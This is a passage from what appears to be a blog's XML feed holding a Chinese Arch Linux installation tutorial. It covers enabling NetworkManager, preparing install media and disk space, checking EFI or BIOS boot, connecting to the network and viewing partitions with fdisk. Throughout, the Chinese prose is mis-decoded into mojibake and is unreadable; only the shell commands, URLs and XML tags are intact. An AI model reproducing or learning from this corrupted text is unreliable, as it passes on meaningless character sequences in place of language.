æå‰é…ç½®ç½‘ç»œåˆ°çŽ°åœ¨æˆ‘ä»¬å·²ç»å®‰è£…å¥½äº†æ¡Œé¢çŽ¯å¢ƒï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä»¶äº‹æƒ…éœ€è¦æˆ‘ä»¬æå‰è®¾ç½®ä¸€ä¸‹ã€‚ç”±äºŽæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„ä¸€ç›´éƒ½æ˜¯netctlè¿™ä¸ªè‡ªå¸¦çš„ç½‘ç»œæœåŠ¡ï¼Œè€Œæ¡Œé¢çŽ¯å¢ƒä½¿ç”¨çš„æ˜¯NetworkManagerè¿™ä¸ªç½‘ç»œæœåŠ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç¦ç”¨netctlå¹¶å¯ç”¨NetworkManagerï¼š 12sudo systemctl disable netctlsudo systemctl enable NetworkManager ï¼ˆæ³¨æ„å¤§å°å†™ï¼‰ åŒæ—¶ä½ å¯èƒ½éœ€è¦å®‰è£…å·¥å…·æ å·¥å…·æ¥æ˜¾ç¤ºç½‘ç»œè®¾ç½®å›¾æ ‡ï¼ˆæŸäº›æ¡Œé¢çŽ¯å¢ƒå·²ç»è£…äº†ï¼Œä½†æ˜¯ä¸ºäº†ä¿é™©å¯ä»¥å†è£…ä¸€ä¸‹ï¼‰ï¼š 1sudo pacman -S network-manager-applet è¿™æ ·å¼€æœºä»¥åŽæˆ‘ä»¬å°±å¯ä»¥åœ¨å›¾å½¢ç•Œé¢ä¸‹é…ç½®æˆ‘ä»¬çš„ç½‘ç»œå•¦ã€‚ é‡æ–°å¯åŠ¨åŽï¼Œå¦‚æžœä½ çœ‹åˆ°æ¡Œé¢ç®¡ç†å™¨çš„ç•Œé¢ï¼Œé€‰æ‹©ä½ éœ€è¦çš„æ¡Œé¢çŽ¯å¢ƒå¹¶è¾“å…¥ç”¨æˆ·åä¸Žå¯†ç ç™»é™†åŽï¼Œçœ‹åˆ°äº†ç†Ÿæ‚‰è€Œåˆé™Œç”Ÿçš„æ¡Œé¢ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å·²ç»å®Œæˆäº†æ¡Œé¢çŽ¯å¢ƒçš„å®‰è£…ï¼ ä½ å¯èƒ½éœ€è¦çŸ¥é“çš„æ“ä½œä¸Žè½¯ä»¶åŒ…æŽ¨èåˆ°è¿™é‡Œï¼ŒArchLinuxçš„å®‰è£…ä¸ŽåŸºæœ¬é…ç½®æ•™ç¨‹å·²ç»ç»“æŸäº†ï¼Œç¬”è€…åœ¨ç¼–å†™è¿‡ç¨‹ä¸­åŸºæœ¬å‡­ç€å¤šæ¬¡å®‰è£…çš„ç»éªŒä¸Žè¿™æ¬¡å®‰è£…çš„è®°å½•å®Œæˆï¼Œéš¾å…ä¼šæœ‰ç–æ¼ä¸Žä¸æ­£ç¡®çš„åœ°æ–¹ï¼Œè¿˜è¯·å¤§å®¶é€šè¿‡ä¸‹é¢çš„è¯„è®ºæˆ–é‚®ä»¶(viseator@gmail.com)æå‡ºæ„è§ä¸Žå»ºè®®ã€‚ä¹Ÿæ¬¢è¿Žä½ ä»¬ä¸Žæˆ‘äº¤æµå®‰è£…çš„é—®é¢˜ã€‚ ä¸‹ä¸€ç¯‡æ–‡ç« ä»‹ç»äº†ä¸€äº›å®žç”¨çš„é…ç½®ï¼ˆå¦‚ä¸­æ–‡è¾“å…¥æ³•çš„å®‰è£…ï¼‰ä¸Žè½¯ä»¶åŒ…ç­‰ã€‚ æœ€åŽå¦‚æžœè§‰å¾—è¿™ç¯‡æ•™ç¨‹å¯¹ä½ æœ‰å¸®åŠ©ï¼Œå¯ä»¥ç§»æ­¥æˆ‘çš„çŸ¥ä¹Žå›žç­”ï¼š Arch Linux æ€Žä¹ˆå®‰è£…ï¼Ÿ - viseatorçš„å›žç­” - çŸ¥ä¹Ž https://www.zhihu.com/question/21427410/answer/171867330 ä¸‹ç‚¹ä¸ªèµžï¼Œè®©æ›´å¤šçš„äººå¯ä»¥çœ‹åˆ°è¿™ç¯‡æ•™ç¨‹ï¼Œä½ çš„æ”¯æŒæ˜¯æˆ‘æœ€å¤§çš„åŠ¨åŠ›ã€‚ å¦‚æžœå®‰è£…è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜ï¼Œå¯ä»¥ç›´æŽ¥åœ¨ä¸‹æ–¹è¯„è®ºåŒºç•™è¨€æˆ–é‚®ä»¶viseator@gmail.comï¼ˆå°½é‡é™„ä¸Šé”™è¯¯ä¿¡æ¯ï¼‰ï¼Œæˆ‘ä¼šå°½åŠ›å›žå¤è§£å†³ã€‚]]></content>
      <categories>
        <category>Linux</category>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»¥å®˜æ–¹Wikiçš„æ–¹å¼å®‰è£…ArchLinux]]></title>
    <url>%2F2017%2F05%2F17%2Farch_install%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢ è¿™å¯èƒ½æ˜¯ä½ èƒ½æ‰¾åˆ°çš„æœ€é€‚åˆä½ çš„ä¸­æ–‡ArchLinuxå®‰è£…æ•™ç¨‹ã€‚ å‰å‡ å¤©ç¡¬ç›˜æŒ‚äº†ï¼Œä¸‡å¹¸çš„æ˜¯å®¶ç›®å½•æ”¾åœ¨äº†å¦ä¸€å—ç¡¬ç›˜ä¸Šæ‰€ä»¥å­˜æ´»äº†ä¸‹æ¥ã€‚ä¸å¾—ä¸å†é‡è£…ä¸€éArchï¼Œç®—ä¸Šå¸®æœ‹å‹è£…çš„ï¼Œè¿™å·²ç»æ˜¯æˆ‘ç¬¬å››æ¬¡å®‰è£…Archäº†ã€‚ä¹Ÿæƒ³å€Ÿæ­¤æœºä¼šè®°å½•è¿™ä¸ªè¿‡ç¨‹å†™ä¸€ç¯‡å®Œå…¨æŒ‰ç…§å®˜æ–¹WikiæŒ‡å¯¼å†åŠ ä¸ŠWikiä¸Šæ²¡æœ‰é‡ç‚¹å†™å‡ºæ¥ä½†æ˜¯å®‰è£…è¿‡ç¨‹ä¸­ä¼šé‡åˆ°çš„ä¸€äº›é—®é¢˜çš„ä¸€ç¯‡ä¸å¤ªä¸€æ ·çš„å®‰è£…æ•™ç¨‹ã€‚ å¾ˆå¤šäººæèµ·èµ·Archçš„ç¬¬ä¸€ååº”å°±æ˜¯å®‰è£…å›°éš¾ï¼Œè¿™ç§å›°éš¾æœ‰å¾ˆå¤šåŽŸå› ï¼Œä¹Ÿå°±æ˜¯æŽ¥ä¸‹æ¥æˆ‘ä»¬å°†ä¼šé¢å¯¹çš„é—®é¢˜ã€‚ æ²¡æœ‰å›¾å½¢ç•Œé¢çš„å¼•å¯¼ï¼šArchåªç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæœ€å°çš„çŽ¯å¢ƒï¼Œæ‰€æœ‰çš„å®‰è£…æ“ä½œéƒ½éœ€è¦åœ¨å‘½ä»¤è¡Œä¸­å®Œæˆï¼Œè¿™å¯¹äºŽä¸ä¹ æƒ¯å‘½ä»¤è¡Œæ“ä½œçš„äººæ¥è¯´æ˜¯æœ€éš¾ä»¥è·¨è¶Šçš„ä¸€ä¸ªåŽã€‚è®¸å¤šå‘è¡Œç‰ˆä¹‹æ‰€ä»¥å¯ä»¥æµè¡Œå¼€æ¥å°±æ˜¯å› ä¸ºä»–ä»¬æä¾›äº†å‹å¥½çš„ã€æµç¨‹åŒ–çš„å®‰è£…è¿‡ç¨‹ï¼Œè¿™å¸®å¾ˆå¤šäººè§£å†³äº†å­¦ä¹ Linuxçš„ç¬¬ä¸€æ­¥ï¼šå®‰è£…ä¸€ä¸ªLinuxã€‚ é¢„å¤‡çŸ¥è¯†çš„ä¸è¶³ä¸Žç¼ºä¹æŸ¥æ‰¾å¹¶è§£å†³é—®é¢˜çš„èƒ½åŠ›ï¼šä¸€äº›å¯¹äºŽå®‰è£…ç³»ç»Ÿæ¯”è¾ƒé‡è¦çš„çŸ¥è¯†ä¾‹å¦‚ç³»ç»Ÿå¼•å¯¼ã€é…ç½®æ–‡ä»¶çš„ç¼–è¾‘ã€ç®€å•çš„å‘½ä»¤è¡Œæ“ä½œç­‰æ²¡æœ‰æŽ¥è§¦è¿‡ï¼Œæ‰€ä»¥æ“ä½œæ—¶å¾€å¾€æ‘¸ä¸ç€å¤´è„‘ï¼Œä¸€æ—¦è‡ªå·±çš„æ“ä½œç»“æžœä¸Žæ•™ç¨‹ä¸ç¬¦ä¾¿ä¸çŸ¥é“å¦‚ä½•åŽ»è§£å†³é‡åˆ°çš„é—®é¢˜ã€‚ ç¼ºä¹åˆé€‚çš„æ•™ç¨‹ï¼šå®‰è£…Archæœ€å¥½çš„ä¹Ÿæ˜¯æœ€å®Œå¤‡çš„æ•™ç¨‹å°±æ˜¯å®˜æ–¹çš„Installation guideä¸ŽWikiï¼Œè™½ç„¶éƒ¨åˆ†å†…å®¹æœ‰ä¸­æ–‡ç‰ˆï¼Œä½†æ˜¯ä¸­æ–‡çš„ç¿»è¯‘æœ‰äº›æ—¶å€™ä¼šè½åŽäºŽè‹±æ–‡ç‰ˆï¼Œä¸æŽ¨èå®Œå…¨ä¾èµ–äºŽä¸­æ–‡Wikiã€‚å¹¶ä¸”å®˜æ–¹Wikiçš„å†™ä½œæ–¹å¼æ›´åå‘äºŽæ–‡æ¡£ï¼Œæ²¡æœ‰æˆ‘ä»¬æ‰€ä¹ æƒ¯çš„æŒ‰æ­¥éª¤ç¼–æŽ’çš„å®‰è£…è¿‡ç¨‹ï¼Œç»™ä¸ç†Ÿæ‚‰è¿™ç§å†™ä½œæ–¹å¼çš„åŒå­¦é€ æˆäº†é˜…è¯»ä¸Žä½¿ç”¨ä¸Šçš„å›°éš¾ã€‚å›½å†…çš„å¯ä»¥æ‰¾åˆ°çš„æ•™ç¨‹å¾€å¾€éƒ½æ˜¯æ—¶é—´æ¯”è¾ƒä¹…è¿œï¼Œæˆ–æ˜¯æ²¡æœ‰æåŠæˆ–æ˜¯å¿½ç•¥äº†ä¸€äº›æ–°æ‰‹å®¹æ˜“çŠ¯é”™è¯¯çš„åœ°æ–¹ã€‚ æœ¬ç¯‡æ•™ç¨‹è‡´åŠ›äºŽä¸ŽçŽ°æœ‰çš„Wikiä¿æŒä¸€è‡´ï¼Œå¹¶ä¸”é€‚å½“åœ°åŠ å…¥ä¸€äº›é€‚åˆåˆå­¦è€…å­¦ä¹ çš„é“¾æŽ¥ï¼Œå¸Œæœ›å¯ä»¥è®©é˜…è¯»äº†è¿™ç¯‡æ•™ç¨‹çš„åŒå­¦å¯ä»¥æé«˜è‡ªå·±åˆ©ç”¨çŽ°æœ‰åŠä»¥åŽå¯èƒ½å‡ºçŽ°çš„æ–°çš„Wikiå†…å®¹çš„èƒ½åŠ›ã€‚ ArchLinuxæˆ–è€…æ˜¯Linuxçš„ä¼˜ç‚¹å°±ä¸åœ¨è¿™é‡Œå¤šè¯´äº†ï¼Œæˆ‘ç›¸ä¿¡æ‰“å¼€è¿™ç¯‡æ•™ç¨‹çš„åŒå­¦ä¸€å®šå¯ä»¥ä»Žè¿™æ ·çš„è¿‡ç¨‹ä¸­å¾—åˆ°å¾ˆå¤šã€‚ æ³¨æ„äº‹é¡¹è¯·ä¸€å®šä»”ç»†é˜…è¯»æ•™ç¨‹ä¸­çš„æ¯ä¸€ä¸ªæŒ‡ç¤ºï¼Œç»å¤§éƒ¨åˆ†å®‰è£…å¤±è´¥éƒ½æ˜¯ç”±äºŽæ²¡æœ‰ä»”ç»†çœ‹æ•™ç¨‹ï¼Œé—æ¼ã€é”™è¾“æŒ‡ä»¤å¯¼è‡´çš„ã€‚å®‰è£…çš„æ–¹å¼æ ¹æ®å¼•å¯¼æ–¹å¼çš„ä¸åŒä¼šæœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥è¯·æŒ‰æ•™ç¨‹ä¸­çš„æŒ‡ç¤ºè¿›è¡Œï¼Œåˆ‡å¿Œä¸€å‘³åœ°è¾“å‘½ä»¤è€Œä¸ç®¡è¯´æ˜Žã€‚ å¯¹äºŽç¡¬ç›˜åˆ†åŒºç›¸å…³çš„æ“ä½œï¼Œè¯·æ›´åŠ å°å¿ƒæ£€æŸ¥å‘½ä»¤ï¼Œæ•°æ®æ— ä»·ã€‚ ä¸‹é¢å°±æ­£å¼å¼€å§‹æˆ‘ä»¬çš„æ•™ç¨‹ã€‚ å®‰è£…æ•™ç¨‹å‰æœŸå‡†å¤‡å®‰è£…ä»‹è´¨åœ¨å®‰è£…ä¹‹å‰æˆ‘ä»¬å…ˆè¦å‡†å¤‡ä¸€ä¸ªå®‰è£…ä»‹è´¨ï¼Œåœ¨è¿™é‡ŒåªæŽ¨èUç›˜ä½œä¸ºå®‰è£…ä»‹è´¨ã€‚ åˆ°https://www.archlinux.org/download/é¡µé¢ä¸‹æ–¹çš„ä¸­å›½é•œåƒæºä¸­ä¸‹è½½archlinux-**-x86_64.isoè¿™ä¸ªisoæ–‡ä»¶ã€‚ å¦‚æžœæ˜¯Linuxç³»ç»Ÿä¸‹åˆ¶ä½œå®‰è£…ä»‹è´¨ï¼ŒæŽ¨èä½¿ç”¨ddå‘½ä»¤ï¼Œæ•™ç¨‹ï¼š http://www.runoob.com/linux/linux-comm-dd.html å¦‚æžœæ˜¯windowsç³»ç»Ÿä¸‹åˆ¶ä½œå®‰è£…ä»‹è´¨ï¼ŒæŽ¨èä½¿ç”¨usbwriterè¿™æ¬¾è½»é‡çº§çš„å·¥å…·ï¼Œä¸‹è½½é“¾æŽ¥ï¼š https://sourceforge.net/projects/usbwriter/ ç£ç›˜å‡†å¤‡æˆ‘ä»¬éœ€è¦æœ‰ä¸€å—ç©ºé—²çš„ç£ç›˜åŒºåŸŸæ¥è¿›è¡Œå®‰è£…ï¼Œè¿™é‡Œçš„ç©ºé—²æŒ‡çš„æ˜¯æ²¡æœ‰è¢«åˆ†åŒºçš„ç©ºé—´ã€‚ä¸‹é¢æ¥ä»‹ç»å¦‚ä½•å‡†å¤‡è¿™å—ç©ºé—´ã€‚ åœ¨windowsä¸‹ç©ºå‡ºä¸€å—åˆ†åŒºæ¥å®‰è£…ï¼šåˆ©ç”¨windowsè‡ªå¸¦çš„ç£ç›˜ç®¡ç†å·¥å…·å°±å¯ä»¥ï¼š å³å‡»windowså›¾æ ‡ï¼Œåœ¨å¼¹å‡ºèœå•ä¸­é€‰æ‹©ç£ç›˜ç®¡ç†ï¼ˆå…¶ä»–ç‰ˆæœ¬çš„windowsè¯·è‡ªè¡Œæ‰¾åˆ°æ‰“å¼€ç£ç›˜ç®¡ç†çš„æ–¹å¼ï¼‰ï¼š å³å‡»æƒ³è¦åˆ é™¤çš„åˆ†åŒºï¼Œé€‰æ‹©åˆ é™¤å·ï¼ˆæ³¨æ„è¿™æ­¥ä¹‹åŽè¿™ä¸ªåˆ†åŒºçš„æ‰€æœ‰æ•°æ®å°†ä¼šä¸¢å¤±ï¼‰ï¼š åœ¨linuxä¸‹åˆ†å‡ºä¸€å—åŒºåŸŸå®‰è£…ï¼šä½¿ç”¨fdiskè¿›è¡Œï¼Œæ•™ç¨‹è¯·è§é“¾æŽ¥ä¸­çš„åˆ é™¤åˆ†åŒºï¼š http://www.liusuping.com/ubuntu-linux/linux-fdisk-disk.html ç©ºé—²çš„ç£ç›˜ï¼ˆæ–°ç£ç›˜ï¼‰ï¼šä¸éœ€è¦è¿›è¡Œä»»ä½•æ“ä½œã€‚ Uç›˜å®‰è£…ä¸‹é¢çš„è¿‡ç¨‹å®žé™…ä¸Šéƒ½åœ¨åˆšåˆšå‡†å¤‡å¥½çš„Uç›˜å¯åŠ¨ä»‹è´¨ä¸Šçš„Linuxç³»ç»Ÿä¸‹è¿›è¡Œï¼Œæ‰€ä»¥å¯åŠ¨æ—¶éƒ½åº”è¯¥é€‰æ‹©Uç›˜ã€‚ è®¾ç½®å¯åŠ¨é¡ºåºè¿™ä¸€æ­¥åœ¨ä¸åŒå“ç‰Œçš„ç”µè„‘ä¸Šéƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥éœ€è¦å¤§å®¶è‡ªè¡Œæœç´¢è‡ªå·±ç”µè„‘å“ç‰Œ+å¯åŠ¨é¡ºåºè¿™ä¸ªå…³é”®è¯æ¥è¿›è¡Œè®¾ç½®ã€‚ ä¾‹å¦‚æˆ‘çš„ç”µè„‘æœç´¢ç¥žèˆŸ å¯åŠ¨é¡ºåºå¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„ç»“æžœï¼š https://zhidao.baidu.com/question/170954184.html ä¸€èˆ¬æ¥è¯´çŽ°åœ¨çš„ä¸»æ¿éƒ½å¯ä»¥ä¸ç”¨è¿›å…¥BIOSè€Œå¿«é€Ÿåœ°åˆ‡æ¢å¯åŠ¨é¡ºåºï¼Œåªè¦æ‰¾åˆ°ç›¸åº”çš„å¿«æ·é”®å°±å¯ä»¥äº†ã€‚ è¿›å…¥Uç›˜ä¸‹çš„Linuxç³»ç»Ÿ æŒ‰ä¸Šä¸€æ­¥è®¾ç½®å¥½å¯åŠ¨é¡ºåºï¼Œå¯åŠ¨ä¹‹åŽä¼šçœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼ˆUEFIå¯åŠ¨æ–¹å¼çš„ç•Œé¢å¯èƒ½ä¸åŒï¼‰ï¼š å¦‚æžœç›´æŽ¥è¿›å…¥windowsï¼Œè¯·æ£€æŸ¥å¯åŠ¨é¡ºåºæ˜¯å¦è®¾ç½®æˆåŠŸï¼ŒUç›˜æ˜¯å¦åœ¨åˆ¶ä½œå¯åŠ¨ä»‹è´¨æ—¶æˆåŠŸå†™å…¥ã€‚ å¦‚æžœæ²¡æœ‰çœ‹åˆ°è¿™ä¸ªç•Œé¢ï¼Œè¯·æ£€æŸ¥Uç›˜æ˜¯å¦åˆ¶ä½œæˆåŠŸï¼Œå¦‚æžœå¤šæ¬¡é‡åˆ°é—®é¢˜å¯ä»¥è€ƒè™‘æ¢ä¸€ä¸ªUç›˜ã€‚ é€‰æ‹©ç¬¬ä¸€ä¸ªé€‰é¡¹ã€‚ è¿™æ—¶Archå¼€å§‹åŠ è½½ï¼Œä½ å°†ä¼šçœ‹åˆ°å±å¹•æ˜¾ç¤ºå¦‚ä¸‹å†…å®¹ï¼š åŠ è½½å®ŒæˆåŽä½ å°†ä¼šè¿›å…¥ä¸€ä¸ªæœ‰å‘½ä»¤æç¤ºç¬¦çš„ç•Œé¢ï¼š å¦‚æžœå‡ºçŽ°FAILæˆ–æ˜¯å…¶ä»–é”™è¯¯ä¿¡æ¯å¯¼è‡´æ— æ³•å¯åŠ¨è¯·è‡ªè¡Œæœç´¢é”™è¯¯ä¿¡æ¯æ¥èŽ·å¾—è§£å†³æ–¹æ³•ã€‚ è¿™å°±æ˜¯Linuxçš„ç»ˆç«¯ç•Œé¢äº†ï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬å°†é€šè¿‡åœ¨è¿™ä¸ªç•Œé¢æ‰§è¡Œä¸€ç³»åˆ—å‘½ä»¤æ¥å°†Archå®‰è£…åˆ°æˆ‘ä»¬çš„ç£ç›˜ä¸Šã€‚ ä¸‹é¢è¿›è¡Œçš„è¿‡ç¨‹æ˜¯æŒ‰ç…§å®˜æ–¹Installation guideä¸ºä¾æ®è¿›è¡Œçš„ï¼Œå‡ºçŽ°çš„ä»»ä½•é—®é¢˜éƒ½å¯ä»¥åˆ°é“¾æŽ¥ä¸­çš„ç›¸åº”éƒ¨åˆ†æŸ¥æ‰¾åŽŸæ–‡æ‰¾åˆ°è§£å†³æ–¹å¼ã€‚ æ£€æŸ¥å¼•å¯¼æ–¹å¼ç›®å‰çš„å¼•å¯¼æ–¹å¼ä¸»è¦åˆ†ä¸ºEFIå¼•å¯¼+GPTåˆ†åŒºè¡¨ä¸ŽBIOS(LEGACY)å¼•å¯¼+MBRåˆ†åŒºè¡¨ä¸¤ç§ï¼Œå‡ ä¹Žæ¯”è¾ƒæ–°çš„æœºå™¨éƒ½é‡‡ç”¨äº†EFI/GPTå¼•å¯¼çš„æ–¹å¼ã€‚å…³äºŽè¿™éƒ¨åˆ†çš„å†…å®¹å¦‚æžœæœ‰å…´è¶£å¯ä»¥é€šè¿‡è¿™ä¸ªé“¾æŽ¥è¿›è¡Œäº†è§£ï¼š http://www.chinaz.com/server/2016/1017/595444.shtml å¦‚æžœä½ ä¸çŸ¥é“è‡ªå·±çš„å¼•å¯¼æ–¹å¼ï¼Œè¯·åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1ls /sys/firmware/efi/efivars è¿™é‡Œçš„lsæ˜¯å‘½ä»¤ï¼Œç©ºæ ¼åŽé¢çš„ä¸€ä¸²ä¸ºè·¯å¾„ï¼Œä½œä¸ºlså‘½ä»¤çš„å‚æ•°ã€‚lså‘½ä»¤çš„ä½œç”¨æ˜¯æ˜¾ç¤ºè·¯å¾„ç›®å½•ä¸‹çš„æ‰€æœ‰çš„æ–‡ä»¶ï¼ˆå¤¹ï¼‰ã€‚ å¦‚æžœä½ å¯¹å‘½ä»¤è¡Œä¸‹çš„å¸¸ç”¨æ“ä½œï¼ˆTABè¡¥å…¨ã€å–æ¶ˆå‘½ä»¤ç­‰ï¼‰ä¸ç†Ÿæ‚‰ï¼Œè¯·å…ˆå­¦ä¹ äº†è§£ä¸‹é¢éƒ¨åˆ†å®žç”¨çš„å¿«æ·é”®æˆ–å‘½ä»¤ï¼š Tabé”® å‘½ä»¤è¡Œè‡ªåŠ¨è¡¥å…¨ã€‚é”®å…¥å‘½ä»¤æˆ–æ–‡ä»¶åçš„å‰å‡ ä¸ªå­—ç¬¦ï¼Œç„¶åŽæŒ‰ [Tab] é”®ï¼Œå®ƒä¼šè‡ªåŠ¨è¡¥å…¨å‘½ä»¤æˆ–æ˜¾ç¤ºåŒ¹é…ä½ é”®å…¥å­—ç¬¦çš„æ‰€æœ‰å‘½ä»¤ â†‘(Ctrl+p) æ˜¾ç¤ºä¸Šä¸€æ¡å‘½ä»¤ â†“(Ctrl+n) æ˜¾ç¤ºä¸‹ä¸€æ¡å‘½ä»¤ Ctrl-C: ç»ˆæ­¢å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤ è¾“å…¥å‘½ä»¤å¹¶å›žè½¦æ‰§è¡ŒåŽï¼Œå¦‚æžœæç¤º 1ls: cannot access '/sys/firmware/efi/efivars': No such file or directory è¡¨æ˜Žä½ æ˜¯ä»¥BIOSæ–¹å¼å¼•å¯¼ï¼Œå¦åˆ™ä¸ºä»¥EFIæ–¹å¼å¼•å¯¼ã€‚çŽ°åœ¨åªéœ€è¦è®°ä½è¿™ä¸ªä¿¡æ¯ï¼Œä¹‹åŽä¼šç”¨åˆ°ã€‚ è”ç½‘archå¹¶ä¸èƒ½ç¦»çº¿å®‰è£…ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦è”ç½‘æ¥ä¸‹è½½éœ€è¦çš„ç»„ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦è¿žæŽ¥ç½‘ç»œã€‚ å¦‚æžœä½ æ˜¯æœ‰çº¿ç½‘å¹¶ä¸”è·¯ç”±å™¨æ”¯æŒDHCPçš„è¯æ’ä¸Šç½‘çº¿åŽå…ˆæ‰§è¡Œä»¥ä¸‹å‘½ä»¤èŽ·å–IPåœ°å€ï¼š 1dhcpcd ç„¶åŽæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç»œè¿žæŽ¥æ˜¯å¦æ­£å¸¸ï¼š 1ping www.baidu.com å¦‚æžœå¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„å†…å®¹å°±è¯´æ˜Žè¿žä¸Šäº†ç½‘ç»œï¼š å†æ¬¡æç¤ºç”¨å¿«æ·é”®Ctrl-Cå¯ä»¥ç»ˆæ­¢å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤ å¦‚æžœä½ æ˜¯æ— çº¿ç½‘ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1wifi-menu è¿™æ˜¯ä¸€ä¸ªå®žç”¨çš„å‘½ä»¤è¡Œä¸‹è”ç½‘å·¥å…·ï¼Œæœ‰å­—ç¬¦å½¢å¼çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œåˆ©ç”¨å®ƒå¯ä»¥æ–¹ä¾¿åœ°è”ç½‘ï¼Œå¦‚æžœå®ƒæ²¡èƒ½èµ·ä½œç”¨ï¼Œéœ€è¦è¿›å…¥ä»¥ä¸‹é¡µé¢æŸ¥æ‰¾è§£å†³æ–¹å¼ï¼š https://wiki.archlinux.org/index.php/Wireless_network_configuration è¿žæŽ¥ä»¥åŽåŒæ ·å¯ä»¥é€šè¿‡ä¸Šé¢çš„pingå‘½ä»¤æ¥è¿›è¡Œæµ‹è¯•ã€‚ æ›´æ–°ç³»ç»Ÿæ—¶é—´æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1timedatectl set-ntp true æ­£å¸¸æƒ…å†µä¸‹è¿™æ ·çš„å‘½ä»¤å¹¶æ²¡æœ‰è¾“å‡ºï¼Œæ‰€è°“æ²¡æœ‰æ¶ˆæ¯å°±æ˜¯æœ€å¥½çš„æ¶ˆæ¯ åˆ†åŒºä¸Žæ ¼å¼åŒ–ç‰¹åˆ«æ³¨æ„ï¼šæ¶‰åŠåˆ°åˆ†åŒºä¸Žæ ¼å¼åŒ–çš„æ“ä½œè¦æ ¼å¤–æ³¨æ„ï¼Œå‘½ä»¤åœ¨å›žè½¦ä¹‹å‰è¯·å†ä¸‰ç¡®è®¤çŸ¥é“è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œå¹¶ä¸”æ²¡æœ‰è¾“é”™å‘½ä»¤ï¼Œå¦åˆ™å°†ä¼šæ¥å¸¦æ¥æ•°æ®çš„ä¸¢å¤±ï¼å¦‚æžœæœ‰éœ€è¦åœ¨æ“ä½œä¹‹å‰è¯·å¤‡ä»½é‡è¦çš„æ•°æ®ã€‚ ä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¹¶ä¸è¦è¿‡äºŽæƒ§æ€•åˆ†åŒºä¸Žæ ¼å¼åŒ–è¿‡ç¨‹ï¼Œæ­£ç¡®æ“ä½œçš„æƒ…å†µä¸‹ä¸ä¼šå¯¹ä½ å…¶ä»–æ•°æ®äº§ç”Ÿä»»ä½•å½±å“ã€‚ æŸ¥çœ‹ç›®å‰çš„åˆ†åŒºæƒ…å†µæ‰§è¡Œå‘½ä»¤ï¼š 1fdisk -l ä»¥æˆ‘çš„ç”µè„‘ä¸ºä¾‹ï¼š å¯ä»¥çœ‹åˆ°æˆ‘çš„ä¸€å—238.5gçš„ç¡¬ç›˜(/dev/sdaå°±ä»£è¡¨è¿™å—ç¡¬ç›˜)ï¼Œä¸‹é¢åˆ—å‡ºäº†/dev/sda*è¿™ä¸‰ä¸ªåˆ†åŒºï¼Œ/dev/sda3æ˜¯æˆ‘å­˜æ´»ä¸‹æ¥çš„å®¶ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°å®ƒçš„ç±»åž‹ä¸ºLinuxåˆ†åŒºã€‚æ³¨æ„çœ‹Startä¸ŽEndçš„æ•°å€¼ï¼Œè¿™ä¸ªæ•°å€¼ä»£è¡¨æ‰‡åŒºå·ï¼Œå¯ä»¥ç†è§£æˆç¡¬ç›˜è¢«åˆ’åˆ†æˆäº†ä¸€ä¸ªä¸ªå°å•å…ƒï¼Œå¯ä»¥ç›´è§‚åœ°çœ‹å‡ºæ¥åœ¨/dev/sda2çš„Endä¸Ž/dev/sda3çš„Startä¹‹é—´ç©ºå‡ºäº†ä¸€å¤§å—æœªåˆ†é…çš„ç©ºé—´ï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬å°†åˆ†é…è¿™å—åŒºåŸŸã€‚ å¦‚æžœä½ æ˜¯BIOS/MBRæ–¹å¼å¼•å¯¼ï¼Œè·³è¿‡ä¸‹é¢åˆ›å»ºä¸€ä¸ªå¼•å¯¼åˆ†åŒºçš„æ­¥éª¤ã€‚ å¦‚æžœä½ æ˜¯EFI/GPTæ–¹å¼å¼•å¯¼ï¼Œå¹¶ä¸”åŒæ—¶å®‰è£…äº†å…¶ä»–ç³»ç»Ÿï¼Œé‚£ä¹ˆä½ åº”è¯¥å¯ä»¥åœ¨åˆ†åŒºåˆ—è¡¨ä¸­å‘çŽ°ä¸€ä¸ªè¾ƒå°çš„å¹¶ä¸”ç±»åž‹ä¸ºEFIçš„åˆ†åŒºï¼ˆæ³¨æ„æŸ¥çœ‹ç¡¬ç›˜çš„å¤§å°ï¼Œè¿™ä¸ªEFIåˆ†åŒºæœ‰å¯èƒ½æ˜¯ä½ Uç›˜ä¸­çš„ï¼Œéœ€è¦æŽ’é™¤ï¼‰ï¼Œè¿™æ˜¯ä½ çš„å¼•å¯¼åˆ†åŒºï¼Œè¯·è®°ä¸‹å®ƒçš„è·¯å¾„ï¼ˆ/dev/sdxY)å¤‡ç”¨ï¼Œè·³è¿‡ä¸‹é¢åˆ›å»ºä¸€ä¸ªå¼•å¯¼åˆ†åŒºçš„æ­¥éª¤ã€‚ å¦‚æžœä½ 